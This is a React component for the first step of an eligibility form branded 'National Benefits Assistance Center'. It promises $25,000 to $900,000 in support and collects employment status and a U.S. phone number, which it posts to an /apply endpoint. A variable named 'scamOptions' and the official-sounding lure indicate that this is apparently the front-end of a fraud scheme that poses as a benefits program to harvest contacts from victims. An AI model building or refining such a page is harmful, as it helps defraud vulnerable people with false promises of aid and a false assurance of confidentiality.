import { useState } from "react";
import { useNavigate } from "react-router-dom";

import {
  Box,
  Button,
  Chip,
  Container,
  LinearProgress,
  Stack,
  Typography,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  FormHelperText,
  TextField,
  Autocomplete,
} from "@mui/material";
import { Controller, useForm } from "react-hook-form";
import taskLogo from "../assets/taskLogo.png";
import toast from "react-hot-toast";
import { SpinnerLoading } from "./SpinnerLoading";
import { supportStore } from "./supportStore";
import api from "./axios";


export default function Eligibility() {
  const [isLoading, setIsLoading] = useState(false);
    
  const navigate = useNavigate();

  const { control, handleSubmit } = useForm({
    defaultValues: {
      amount: "",
      when: "",
      employment: "",
      phone: "",
    },
  });
  
    const scamOptions = [
        "Immediately",
         "Within 7 Days",
         "Within 30 Days",
         "Within 60 Days",
         "No Specific Timeline",
    ];

    const type = supportStore((state) => state.type);

    const updatePhone = supportStore((state) => state.updatePhone);

      const onSubmit = async (data) => {
        try {
          setIsLoading(true);
          const response = await api.post("/apply", {
            type,
            amount: data.amount,
            when: data.when,
            employment: data.employment,
            phone: data.phone,
          });
          const { success, message } = response.data;

          if (!success)
            return toast.error(message || "Please try again.");

          updatePhone({phone: data.phone, amount: data.amount});

          toast.success(message);

          return navigate("/location-eligibility");

        } catch (err) {
          toast.error(err.response?.data?.message);
        } finally {
          setIsLoading(false);
        }
      };

  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#F5F7FB",
        py: 6,
      }}
    >
      <Container maxWidth="lg">
        {/* Logo */}
        <Stack alignItems="center" spacing={2}>
          <Box
            component="img"
            src={taskLogo}
            alt="Traceon Guard"
            sx={{
              width: 90,
              height: 90,
              objectFit: "contain",
            }}
          />
        </Stack>
        <Stack spacing={5}>
          {/* Progress */}

          <Box>
            <Stack direction="row" justifyContent="space-between" mb={2}>
              <Typography fontWeight={700} color="primary">
                Step 1 of 4
              </Typography>
            </Stack>

            <LinearProgress
              variant="determinate"
              value={50}
              sx={{
                height: 10,
                borderRadius: 20,
              }}
            />
          </Box>

          {/* Header */}

          <Stack spacing={2} alignItems="center" textAlign="center">
            <Chip color="primary" label="National Benefits Assistance Center" />

            <Typography variant="h3" fontWeight={800}>
              Eligibility Information
            </Typography>

            <Typography maxWidth={700} color="text.secondary" fontSize={18}>
              Please provide the information below to continue your application.
              Your responses help us determine the best {type} support for your
              needs.
            </Typography>
          </Stack>
        </Stack>

        <form onSubmit={handleSubmit(onSubmit)}>
          <Stack spacing={4}>
            <Controller
              name="amount"
              control={control}
              rules={{ required: "Amount needed is required" }}
              render={({ field, fieldState }) => (
                <FormControl fullWidth error={!!fieldState.error}>
                  <InputLabel>Amount Needed</InputLabel>
                  <Select {...field} label="How much do you need?">
      
                    <MenuItem value="$25,000 - $50,000">
                      $25,000 - $50,000
                    </MenuItem>
                    <MenuItem value="$50,000 - $100,000">
                      $50,000 - $100,000
                    </MenuItem>
                    <MenuItem value="$100,000 - $300,000">
                      $100,000 - $300,000
                    </MenuItem>
                    <MenuItem value="$300,000 - $500,000">
                      $300,000 - $500,000
                    </MenuItem>
                    <MenuItem value="$300,000 - $900,000">
                      $300,000 - $900,000
                    </MenuItem>
                  </Select>
                  <FormHelperText>{fieldState.error?.message}</FormHelperText>
                </FormControl>
              )}
            />

            <Controller
              name="when"
              control={control}
              rules={{ required: "Select how soon you need assistance" }}
              render={({ field, fieldState }) => (
                <Autocomplete
                  options={scamOptions}
                  onChange={(_, value) => field.onChange(value)}
                  renderInput={(params) => (
                    <TextField
                      {...params}
                      label="How Soon Do You Need Assistance?"
                      error={!!fieldState.error}
                      helperText={fieldState.error?.message}
                    />
                  )}
                />
              )}
            />

            <Controller
              name="employment"
              control={control}
              rules={{ required: "Select employment status" }}
              render={({ field, fieldState }) => (
                <FormControl fullWidth error={!!fieldState.error}>
                  <InputLabel>Employment Status</InputLabel>
                  <Select {...field} label="Your employment status?">
                    <MenuItem value="Employed">Employed</MenuItem>
                    <MenuItem value="Self-Employed">Self-Employed</MenuItem>
                    <MenuItem value="Business Owner">Business Owner</MenuItem>
                    <MenuItem value="Retired">Retired</MenuItem>
                    <MenuItem value="Farmer">Farmer</MenuItem>
                    <MenuItem value="Students">Students</MenuItem>
                    <MenuItem value="Unemployed">Unemployed</MenuItem>
                  </Select>
                  <FormHelperText>{fieldState.error?.message}</FormHelperText>
                </FormControl>
              )}
            />

            <Controller
              name="phone"
              control={control}
              rules={{
                required: "Phone number is required",
                pattern: {
                  value: /^(\+1\s?)?(\(\d{3}\)|\d{3})[-.\s]?\d{3}[-.\s]?\d{4}$/,
                  message: "Enter a valid U.S. phone number",
                },
              }}
              render={({ field, fieldState }) => (
                <TextField
                  {...field}
                  type="tel"
                  label="Phone Number"
                  placeholder="(555) 123-4567"
                  fullWidth
                  error={!!fieldState.error}
                  helperText={fieldState.error?.message}
                />
              )}
            />

            {/* Continue */}
            <Button
              type="submit"
              size="large"
              variant="contained"
              fullWidth
             
            >
              Continue
            </Button>

            {/* Security */}
            <Typography
              variant="caption"
              color="text.secondary"
              textAlign="center"
              sx={{
                lineHeight: 1.7,
              }}
            >
              🔒 All information is kept secure and confidential.
            </Typography>
            <Button
              onClick={() => navigate("/support-type")}
              variant="text"
              sx={{
                textTransform: "none",
                fontWeight: 700,
              }}
            >
              ← Back to previous page
            </Button>
          </Stack>
        </form>
      {isLoading && <SpinnerLoading/>}
        
      </Container>
    </Box>
  );
}
